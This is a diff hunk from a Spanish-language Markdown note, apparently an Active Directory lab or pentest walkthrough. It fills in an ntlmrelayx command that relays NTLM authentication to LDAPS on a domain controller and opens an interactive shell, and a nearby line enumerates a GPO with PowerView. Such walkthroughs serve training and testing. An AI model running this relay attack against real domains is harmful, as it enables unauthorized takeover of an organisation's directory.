@@ -28,7 +28,7 @@ Get-DomainGPO -Identity 'DevOps Policy'
 
 A continuación necesitaremos ejecutar *ntlmrelayx* usando *WSL* para poder retrasmitir el servicio LDAP en el controlador de dominio
 ```shell
-sudo ntlmrelayx.py -t ldaps://<IP_DC> -wh <IP_VM> --http-port '80,8080' -i --no-smb-server
+sudo ntlmrelayx.py -t ldaps://172.16.2.1 -wh 172.16.100.97 --http-port '80,8080' -i --no-smb-server
 ```
 
 ```ad-warning
